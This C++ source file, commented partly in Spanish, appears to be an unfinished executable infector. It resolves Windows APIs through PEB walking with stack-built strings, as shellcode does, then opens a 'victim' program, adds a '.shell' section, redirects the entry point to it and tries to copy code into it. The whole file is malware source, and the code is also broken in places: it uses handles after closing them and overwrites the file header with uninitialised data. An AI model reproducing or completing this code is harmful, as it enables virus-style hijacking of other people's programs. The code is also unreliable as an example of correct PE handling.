#include <Windows.h>
#include "peb-lookup.h"
#include <string>
#include <sstream>

// Strings almacenados en la sección .text
#pragma code_seg(".text")




__declspec(allocate(".text"))
wchar_t kernel32_str[] = L"kernel32.dll";

__declspec(allocate(".text"))

#ifndef CUSTOM_ALIGN_UP
#define CUSTOM_ALIGN_UP(value, alignment) (((value) + ((alignment) - 1)) & ~((alignment) - 1))
#endif

char load_lib_str[] = "LoadLibraryA";


// Stack based strings for libraries and functions the shellcode needs
wchar_t kernel32_dll_name[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0 };
char load_lib_name[] = { 'L','o','a','d','L','i','b','r','a','r','y','A',0 };
char get_proc_name[] = { 'G','e','t','P','r','o','c','A','d','d','r','e','s','s', 0 };
char kr32_dll_name[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0 };
char user32_dll_name[] = { 'u','s','e','r','3','2','.','d','l','l', 0 };
char ucrtbase_dll_name[] = { 'u','c','r','t','b','a','s','e','.','d','l','l' };
char message_box_name[] = { 'M','e','s','s','a','g','e','B','o','x','W', 0 };
char cf_name[] = { 'C','r','e','a','t','e','F','i','l','e','A', 0 };
char rf_name[] = { 'R','e','a','d','F','i','l','e', 0 };
char close_handle_name[] = { 'C','l','o','s','e','H','a','n','d','l','e', 0 };
char mb_to_wc_name[] = { 'M','u','l','t','i','B','y','t','e','T','o','W','i','d','e','C','h','a','r', 0 };
char strncmp_name[] = { 's','t','r','n','c','m','p', 0 };
char get_file_size_name[] = { 'G','e','t','F','i','l','e','S','i','z','e', 0 };
char map_view_of_file_name[] = { 'M','a','p','V','i','e','w','O','f','F','i','l','e', 0 };
char unmap_view_of_file_name[] = { 'U','n','m','a','p','V','i','e','w','O','f','F','i','l','e', 0 };
char create_file_mapping_name[] = { 'C','r','e','a','t','e','F','i','l','e','M','a','p','p','i','n','g','A', 0 };
// stack based strings to be passed to the messagebox win api
wchar_t msg_content[] = { 'H','e','l','l','o', ' ', 'W','o','r','l','d','!', 0 };
wchar_t msg_title[] = { 'D','e','m','o','!', 0 };
char  fileName[] = { 'c', '-', 's','h','e','l','l','c','o','d','e','.','e','x','e', 0 };
char  fileName_vic[] = { 'y', 'u', 's','k','o','v','i','c','.','e','x','e', 0 };
// Nombre de la función
char func_name[] = { 's','t','r','n','c','m','p',0 };
// Read the file
const DWORD bufferSize = 64;
char buffer[bufferSize] = { 0 };
DWORD bytesRead;
wchar_t wide_buffer[bufferSize]; // Crear un buffer Unicode
// Definición del nombre de la función malloc
char malloc_name[] = { 'm', 'a', 'l', 'l', 'o', 'c', 0 };
// Definición del nombre de la función memcpy
char memcpy_name[] = { 'm', 'e', 'm', 'c', 'p', 'y', 0 };

// Declarar las funciones globales
HMODULE(WINAPI* _LoadLibraryA)(LPCSTR lpLibFileName);
FARPROC(WINAPI* _GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
DWORD(WINAPI* _GetFileSize)(HANDLE hFile, LPDWORD lpFileSizeHigh);
LPVOID(WINAPI* _MapViewOfFile)(HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap);
BOOL(WINAPI* _UnmapViewOfFile)(LPCVOID lpBaseAddress);
HANDLE(WINAPI* _CreateFileMappingA)(HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCSTR lpName);
BOOL(WINAPI* _ReadFile)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
int(WINAPI* _MessageBoxW)(HWND hWnd, LPCWSTR lpText, LPCWSTR lpCaption, UINT uType);
int(WINAPI* _MultiByteToWideChar)(UINT CodePage, DWORD dwFlags, LPCCH lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);
BOOL(WINAPI* _CloseHandle)(HANDLE hObject);
int(WINAPI* _strncmp)(const char* str1, const char* str2, size_t num);
errno_t(CDECL* _strcpy_s)(char* dest, size_t destsz, const char* src);
void(WINAPI* _ZeroMemory)(PVOID ptr, SIZE_T size);
DWORD(WINAPI* _SetFilePointer)(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod);
BOOL(WINAPI* _SetEndOfFile)(HANDLE hFile);
void* (WINAPI* _malloc)(size_t size);
void* (WINAPI* _memcpy)(void* dest, const void* src, size_t n);
HANDLE(WINAPI* _CreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
BOOL(WINAPI* _WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
void* (WINAPI* _memset)(void* dest, int value, size_t num);
BOOL(WINAPI* _FlushViewOfFile)(LPCVOID lpBaseAddress, SIZE_T dwNumberOfBytesToFlush);
DWORD(WINAPI* _GetLastError)();  // Declarar GetLastError

// Función para inicializar las funciones globales
bool InitializeFunctions() {
    LPVOID base = get_module_by_name((const LPWSTR)kernel32_dll_name);
    if (!base) return false;

    _LoadLibraryA = (HMODULE(WINAPI*)(LPCSTR)) get_func_by_name((HMODULE)base, (LPSTR)load_lib_name);
    _GetProcAddress = (FARPROC(WINAPI*)(HMODULE, LPCSTR)) get_func_by_name((HMODULE)base, (LPSTR)get_proc_name);
    if (!_LoadLibraryA || !_GetProcAddress) return false;

    HMODULE k32_dll = _LoadLibraryA(kr32_dll_name);
    HMODULE u32_dll = _LoadLibraryA(user32_dll_name);
    HMODULE hLibC = _LoadLibraryA(ucrtbase_dll_name);

    if (!k32_dll || !u32_dll || !hLibC) return false;
    _CreateFileA = (HANDLE(WINAPI*)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE)) _GetProcAddress(k32_dll, "CreateFileA");
    _GetFileSize = (DWORD(WINAPI*)(HANDLE, LPDWORD)) _GetProcAddress(k32_dll, get_file_size_name);
    _MapViewOfFile = (LPVOID(WINAPI*)(HANDLE, DWORD, DWORD, DWORD, SIZE_T)) _GetProcAddress(k32_dll, map_view_of_file_name);
    _UnmapViewOfFile = (BOOL(WINAPI*)(LPCVOID)) _GetProcAddress(k32_dll, unmap_view_of_file_name);
    _CreateFileMappingA = (HANDLE(WINAPI*)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR)) _GetProcAddress(k32_dll, create_file_mapping_name);
    _ReadFile = (BOOL(WINAPI*)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED)) _GetProcAddress(k32_dll, rf_name);
    _MessageBoxW = (int(WINAPI*)(HWND, LPCWSTR, LPCWSTR, UINT)) _GetProcAddress(u32_dll, message_box_name);
    _MultiByteToWideChar = (int(WINAPI*)(UINT, DWORD, LPCCH, int, LPWSTR, int)) _GetProcAddress(k32_dll, mb_to_wc_name);
    _CloseHandle = (BOOL(WINAPI*)(HANDLE)) _GetProcAddress(k32_dll, close_handle_name);
    _strncmp = (int(WINAPI*)(const char*, const char*, size_t)) _GetProcAddress(hLibC, strncmp_name);
    _strcpy_s = (errno_t(CDECL*)(char*, size_t, const char*)) _GetProcAddress(hLibC, "strcpy_s");
    _ZeroMemory = (void(WINAPI*)(PVOID, SIZE_T)) _GetProcAddress(k32_dll, "ZeroMemory");

    _SetFilePointer = (DWORD(WINAPI*)(HANDLE, LONG, PLONG, DWORD)) _GetProcAddress(k32_dll, "SetFilePointer");
    _SetEndOfFile = (BOOL(WINAPI*)(HANDLE)) _GetProcAddress(k32_dll, "SetEndOfFile");
    _malloc = (void* (WINAPI*)(size_t)) _GetProcAddress(hLibC, malloc_name);
    _memcpy = (void* (WINAPI*)(void*, const void*, size_t)) _GetProcAddress(hLibC, memcpy_name);

    // Inicializar WriteFile, FlushViewOfFile y memset
    _WriteFile = (BOOL(WINAPI*)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED)) _GetProcAddress(k32_dll, "WriteFile");
    _FlushViewOfFile = (BOOL(WINAPI*)(LPCVOID, SIZE_T)) _GetProcAddress(k32_dll, "FlushViewOfFile");
    _memset = (void* (WINAPI*)(void*, int, size_t))_GetProcAddress(hLibC, "memset");

    // Inicializar GetLastError
    _GetLastError = (DWORD(WINAPI*)()) _GetProcAddress(k32_dll, "GetLastError");

    return _GetFileSize && _MapViewOfFile && _UnmapViewOfFile && _CreateFileMappingA && _ReadFile && _MessageBoxW &&
        _MultiByteToWideChar && _CloseHandle && _strncmp && _strcpy_s && _ZeroMemory && _SetFilePointer &&
        _SetEndOfFile && _malloc && _memcpy && _CreateFileA && _WriteFile && _FlushViewOfFile && _memset && _GetLastError;
}
// Función para convertir un valor numérico a un string wide (wstring)
std::wstring to_wstring(int value) {
    std::wstringstream wss;
    wss << value;
    return wss.str();
}
void showError(DWORD error) {
    std::wstring message = L"Error occurred. Error code: ";
    message += std::to_wstring(error);

    _MessageBoxW(0, message.c_str(), L"Error", MB_OK);
}
// Función para copiar la sección .text a .shell
bool CopyTextToShell(LPVOID exeBase, DWORD textSectionSize) {
    DWORD shellSectionSize = textSectionSize;  // O ajusta según sea necesario

    // Crear la sección .shell en la memoria mapeada
    void* shellSection = _malloc(shellSectionSize); // O usa mapeo de memoria si es necesario
    if (!shellSection) {
        return false;
    }

    // Copiar el contenido de la sección .text a .shell
    _memcpy(shellSection, exeBase, shellSectionSize); // Ajusta el puntero según la ubicación de la sección .shell

    // Aquí puedes modificar el encabezado del archivo PE si es necesario para incluir la nueva sección .shell

    return true;
}

bool AddShellSectionAndModifyEntryPoint(HANDLE hFile_vic) {
    const DWORD shellSectionSize = 4096;  // Por ejemplo, 4 KB para el tamaño de la sección
    HANDLE hMapping = _CreateFileMappingA(hFile_vic, nullptr, PAGE_READWRITE, 0, 0, nullptr);
  
    if (!hMapping) {
        // Handle error if mapping creation fails
        _MessageBoxW(0, L"Error creating file mapping.", L"Error", MB_OK);
        _CloseHandle(hFile_vic);
        return false;
    }

    _MessageBoxW(0, L"hMapping created", L"Debugging", MB_OK);

    BYTE* pBase = (BYTE*)_MapViewOfFile(hMapping, FILE_MAP_WRITE, 0, 0, 0);
    if (!pBase) {
        // Handle error if mapping fails
        _MessageBoxW(0, L"Error mapping file to memory.", L"Error", MB_OK);
        _CloseHandle(hMapping);
        _CloseHandle(hFile_vic);
        return false;
    }

    _MessageBoxW(0, L"File mapped to memory", L"Debugging", MB_OK);

    // Check PE file structure by validating DOS header
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)pBase;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        // Not a valid PE file
        _MessageBoxW(0, L"Invalid PE file (DOS signature check failed).", L"Error", MB_OK);
        _UnmapViewOfFile(pBase);
        _CloseHandle(hMapping);
        _CloseHandle(hFile_vic);
        return false;
    }

    _MessageBoxW(0, L"DOS signature exists", L"Debugging", MB_OK);

    // Locate the NT header by adding the DOS header's e_lfanew offset
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(pBase + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        // Invalid NT header
        _MessageBoxW(0, L"Invalid PE file (NT signature check failed).", L"Error", MB_OK);
        _UnmapViewOfFile(pBase);
        _CloseHandle(hMapping);
        _CloseHandle(hFile_vic);
        return false;
    }

    _MessageBoxW(0, L"NT signature exists", L"Debugging", MB_OK);

    // Now we can proceed with modifying the PE file.
    // Let's say we want to inject a new section (.shell) and modify the entry point.
    // 1. Update the section headers
    // 2. Modify the entry point in the NT headers to point to the new shellcode section

    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
    DWORD numberOfSections = ntHeaders->FileHeader.NumberOfSections;

    // Find a free slot to add the new section
    PIMAGE_SECTION_HEADER newSectionHeader = &sectionHeader[numberOfSections];

    _MessageBoxW(0, L"New Section Created", L"Debugging", MB_OK);
    _memset(newSectionHeader, 0, sizeof(IMAGE_SECTION_HEADER)); // Initialize the new section header
    
    _MessageBoxW(0, L"memset", L"Debugging", MB_OK);
    // Set section name and characteristics
    _memcpy(newSectionHeader->Name, ".shell", sizeof(".shell") - 1);
    newSectionHeader->Misc.VirtualSize = shellSectionSize;
    newSectionHeader->VirtualAddress = ntHeaders->OptionalHeader.SizeOfImage;
    newSectionHeader->SizeOfRawData = shellSectionSize;
    newSectionHeader->PointerToRawData = ntHeaders->OptionalHeader.SizeOfImage;

 
    // Modify the entry point to point to the new shellcode section
    ntHeaders->OptionalHeader.AddressOfEntryPoint = newSectionHeader->VirtualAddress;

    // Update the SizeOfImage field in the OptionalHeader
    ntHeaders->OptionalHeader.SizeOfImage += shellSectionSize;

   

    // Convierte a una cadena multibyte de forma segura
    char* charString = new char[12];
    size_t convertedChars = 0;


    // Luego usa strcpy_s para copiar la cadena convertida
    
    if (pBase) {
        _strcpy_s(pBase, 12, charString);
           _FlushViewOfFile(pBase, 0);
           _UnmapViewOfFile(pBase);
           _MessageBoxW(0, L"Hola ", L"Error", MB_OK);
        }
        _CloseHandle(hMapping);
    
    _CloseHandle(hFile_vic);

   
   
    if (_SetFilePointer(hFile_vic, 0, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER) {
       
        _MessageBoxW(0, L"Error setting file pointer. " , L"Error", MB_OK);
        _UnmapViewOfFile(pBase);
        _CloseHandle(hMapping);
        _CloseHandle(hFile_vic);
        return false;
    }

    if (pBase == nullptr) {
        _MessageBoxW(0, L"Mapping failed: pBase is null.", L"Error", MB_OK);
        _UnmapViewOfFile(pBase);
        _CloseHandle(hMapping);
        _CloseHandle(hFile_vic);
        return false;
    }


    // Luego, escribe los datos de vuelta al archivo
    DWORD bytesWritten = 0;
    BOOL writeSuccess = _WriteFile(hFile_vic, pBase, ntHeaders->OptionalHeader.SizeOfImage, &bytesWritten, NULL);
    if (!writeSuccess || bytesWritten != ntHeaders->OptionalHeader.SizeOfImage) {
      
        _MessageBoxW(0, L"Failed to write to file. Error code: ", L"Error", MB_OK);
        return false;
    }

    // Cleanup and close handles
    _UnmapViewOfFile(pBase);
    _CloseHandle(hMapping);
    _CloseHandle(hFile_vic);

    _MessageBoxW(0, L"PE File modified successfully.", L"Success", MB_OK);
    return true;
}

// Función auxiliar para alinear valores
DWORD ALIGN_UP(DWORD size, DWORD align) {
    return (size + align - 1) & ~(align - 1);
}


void* GetTextSection(void* exeBase, DWORD* sectionSize) {



    // Obtener el encabezado DOS
    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)exeBase;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return NULL; // No es un archivo válido
    }

    // Obtener el encabezado NT
    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)exeBase + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return NULL; // Encabezado NT inválido
    }

    // Obtener la tabla de secciones
    IMAGE_SECTION_HEADER* sectionHeaders = (IMAGE_SECTION_HEADER*)((BYTE*)&ntHeaders->OptionalHeader + ntHeaders->FileHeader.SizeOfOptionalHeader);

    // Iterar por las secciones
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (_strncmp((char*)sectionHeaders[i].Name, ".text", 5) == 0) {
            *sectionSize = sectionHeaders[i].Misc.VirtualSize;
            return (void*)((BYTE*)exeBase + sectionHeaders[i].VirtualAddress);
        }
    }

    return NULL; // Sección .text no encontrada
}

int main() {

    InitializeFunctions();

    _MessageBoxW(0, L"Inicio", L"Depuracion", MB_OK);
    //Inicio 
    HANDLE hFile = _CreateFileA(
        fileName,              // Nombre del archivo
        GENERIC_READ,          // Permisos de lectura
        0,                     // No compartir
        NULL,                  // Seguridad predeterminada
        OPEN_EXISTING,         // Abrir archivo existente
        FILE_ATTRIBUTE_NORMAL, // Atributos normales
        NULL);                 // No hay plantilla de archivo

    if (hFile == INVALID_HANDLE_VALUE) {
        _MessageBoxW(0, L"Error al abrir el archivo", L"Error", MB_OK);
        return 5; // Error al abrir el archivo
    }
    // invoke the message box for debug
    _MessageBoxW(0, L"File was opened for read", L"Depuracion", MB_OK);

    BOOL result = _ReadFile(hFile, buffer, bufferSize - 1, &bytesRead, NULL);
    _MessageBoxW(0, L"File was read", L"Depuracion", MB_OK);
    if (result && bytesRead > 0) {
      // Agregar carácter nulo para terminar la cadena
      buffer[bytesRead] = '\0';
       // Mostrar contenido leído (requiere `_MessageBoxW` o `_MultiByteToWideChar`)
      wchar_t wideBuffer[bufferSize] = { 0 };
      _MultiByteToWideChar(CP_ACP, 0, buffer, bytesRead, wideBuffer, bufferSize);
       _MessageBoxW(0, wideBuffer, L"Contenido del Archivo", MB_OK);
        }
        else {
            _MessageBoxW(0, L"I cant read a main file!", L"Error", MB_OK);
        }
   
        _CloseHandle(hFile);
        // invoke the message box winapi
        _MessageBoxW(0, L"File was closed", L"Depuracion", MB_OK);
  
    hFile = _CreateFileA(
        fileName,              // Nombre del archivo
        GENERIC_READ,          // Permisos de lectura
        0,                     // No compartir
        NULL,                  // Seguridad predeterminada
        OPEN_EXISTING,         // Abrir archivo existente
        FILE_ATTRIBUTE_NORMAL, // Atributos normales
        NULL);                 // No hay plantilla de archivo

    if (hFile == INVALID_HANDLE_VALUE) {
        _MessageBoxW(0, L"Error al abrir el archivo", L"Error", MB_OK);
        return 5; // Error al abrir el archivo
    }
    // invoke the message box winapi
    _MessageBoxW(0, L"_CreateFileA", L"Depuracion", MB_OK);

    DWORD fileSize = _GetFileSize(hFile, NULL);
    // invoke the message box winapi
    _MessageBoxW(0, L"GetFileSize(hFile, NULL)", L"Depuracion", MB_OK);

    HANDLE hMapping = _CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (!hMapping) {
        _MessageBoxW(0, L"Error creating file mapping.", L"Error", MB_OK);
        _CloseHandle(hFile);
        return 1;
    }
    // invoke the message box winapi
    _MessageBoxW(0, L"GetFileSize(hFile, NULL)", L"Depuracion", MB_OK);

    void* exeBase = _MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!exeBase) {
        _MessageBoxW(0, L"Error mapping view of file..", L"Error", MB_OK);
        _CloseHandle(hMapping);
        _CloseHandle(hFile);
        return 1;
    }
    // invoke the message box winapi
    _MessageBoxW(0, L"MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0)", L"Depuracion", MB_OK);

    DWORD sectionSize = 0;
    void* textSection = GetTextSection(exeBase, &sectionSize);
    if (textSection) {
        _MessageBoxW(0, L"Sección .text encontrada.  ", L"Aviso", MB_OK);
    
    }
    else {
        _MessageBoxW(0, L"No se encontró la sección .text.", L"Error", MB_OK);
    }
    // invoke the message box winapi
    _MessageBoxW(0, L"GetTextSection(exeBase, &sectionSize, strncmp_func)", L"Depuracion", MB_OK);

    _UnmapViewOfFile(exeBase);
    // invoke the message box winapi
    _MessageBoxW(0, L"UnmapViewOfFile(exeBase)", L"Depuracion", MB_OK);
    _CloseHandle(hMapping);
    // invoke the message box winapi
    _MessageBoxW(0, L"_CloseHandle(hMapping)", L"Depuracion", MB_OK);

    _CloseHandle(hFile);
    // invoke the message box winapi
    _MessageBoxW(0, L"_CloseHandle(hFile)", L"Depuracion", MB_OK);

   
    HANDLE hFile_vic = _CreateFileA(
        fileName_vic,              // Nombre del archivo
        GENERIC_READ | GENERIC_WRITE,          // Permisos de lectura
        0,                     // No compartir
        NULL,                  // Seguridad predeterminada
        OPEN_EXISTING,         // Abrir archivo existente
        FILE_ATTRIBUTE_NORMAL, // Atributos normales
        NULL);                 // No hay plantilla de archivo

    if (hFile_vic == INVALID_HANDLE_VALUE) {
        _MessageBoxW(0, L"Error al abrir el archivo vic", L"Error", MB_OK);
        return 5; // Error al abrir el archivo
    }
    _MessageBoxW(0, L"_CreateFileA(2x)", L"Depuracion", MB_OK);
    bool AddedEntryPoint = AddShellSectionAndModifyEntryPoint(hFile_vic);
    _MessageBoxW(0, L"Add section", L"Depuracion", MB_OK);
    // Copiar contenido de .text a .shell
      
    if (CopyTextToShell(exeBase, sectionSize)) {
        _MessageBoxW(0, L"Contenido de .text copiado a .shell", L"Éxito", MB_OK);
    }
    else {
        _MessageBoxW(0, L"Error al copiar la sección .text", L"Error", MB_OK);
    }
    // Limpiar recursos
    _UnmapViewOfFile(exeBase);
    _CloseHandle(hMapping);
    _CloseHandle(hFile_vic);

    return 0;
}